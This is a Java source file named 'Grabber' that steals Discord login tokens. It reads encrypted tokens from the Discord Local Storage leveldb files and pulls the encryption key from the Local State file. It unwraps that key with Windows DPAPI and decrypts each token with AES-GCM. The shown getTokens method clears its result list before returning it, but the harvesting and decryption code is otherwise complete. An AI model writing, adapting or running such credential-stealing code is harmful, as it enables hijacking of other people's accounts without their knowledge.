import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.Arrays;
import java.util.Base64;
import java.util.LinkedList;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import com.sun.jna.platform.win32.Crypt32Util;
import org.json.JSONObject;

public class Grabber {
    
    public static List<String> getTokens() {
        String key = Key();
        List<String> token = Tokens();
        if(key == null) return null;
        if(token == null) return null;
        LinkedList<String> tokens = new LinkedList<String>();
        for(String s : token) { 
            try {
                byte[] z = Base64.getDecoder().decode(key);
                byte[] y = Arrays.copyOfRange(z, 5, z.length);
                tokens.add(decrypt(Base64.getDecoder().decode(s), y));
            } catch (Exception e) {}
        }
        tokens.clear();
        return tokens;
    }


    private static List<String> Tokens() {
        LinkedList<String> token = new LinkedList<String>();
        String regex = "dQw4w9WgXcQ:";
        File[] files = new File(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb\\").listFiles();
        for (File file : files) {
                try {
                    try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                        String line;
                        while ((line = br.readLine()) != null) if (line.contains(regex)) token.add(line.split(regex)[1].split("\"")[0]);
                    }
                } catch (Exception e) {}
        }
        return token;
    }

    private static String Key() {
        try {
        try (BufferedReader brs = new BufferedReader(new FileReader(new File(System.getenv("APPDATA") + "\\discord\\Local State")))) {
            String line;
            while ((line = brs.readLine()) != null) {
                return new JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key");
            }
        }
        } catch (Exception e) {}
        return null;
    }

    private static String decrypt(byte[] token, byte[] key) throws Exception {
        byte[] finalKey = Crypt32Util.cryptUnprotectData(key);
        byte[] finaltoken = new byte[12];
        for (int i = 0; i < 12; i++) finaltoken[i] = token[i + 3];
        byte[] data = new byte[token.length - 15];
        for (int i = 0; i < data.length; i++) data[i] = token[i + 15];
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(finalKey, "AES"), new GCMParameterSpec(128, finaltoken));
        return new String(cipher.doFinal(data));
    }
}
